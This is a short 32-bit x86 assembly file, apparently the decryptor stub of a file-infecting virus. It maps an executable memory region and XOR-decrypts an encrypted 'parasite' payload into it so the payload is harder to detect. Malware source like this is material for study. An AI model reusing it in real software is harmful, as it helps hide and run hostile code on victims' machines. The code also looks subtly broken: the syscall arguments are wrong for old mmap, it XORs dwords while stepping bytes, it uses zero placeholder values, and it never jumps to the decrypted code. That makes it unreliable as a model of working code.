BITS 32

; x86 polymorphic in mmap'd region preamble
; very primitive polymorphism, simly decrypts
; the parasite with a one-byte xor key

pusha ; preserve registers

; invoke mmap
; addr = mmap(NULL, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE,
;	-1, 0);

push 0x00000000 ; size

mov eax, 90
mov ebx, 0
mov ecx, [esp] ; size
mov edx, 7  ; PROT_READ | PROT_WRITE | PROT_EXEC
mov esi, 34 ; MAP_ANONYMOUS | MAP_PRIVATE
mov edi, -1
mov ebp, 0
int 0x80

mov edx, eax

call geteip
geteip:    ; geteip
	pop ebx
add ebx, 0x0 ; offset to code (not a parameter)
mov eax, 0x00000000 ; key

; edi is i        ; offset into to encrypted payload
; esi is n        ; size of encrypted payload
; edx is addr     ; the address of the new mmap'd segment

xor edi, edi
pop esi
push eax ; push key for safe keeping

decrypt:
	xor eax, [ebx+edi]
	mov [edx+edi], eax
	mov eax, [esp] ; restore the key	
	inc edi	
	cmp edi, esi
	jl decrypt

popa ; restore registers
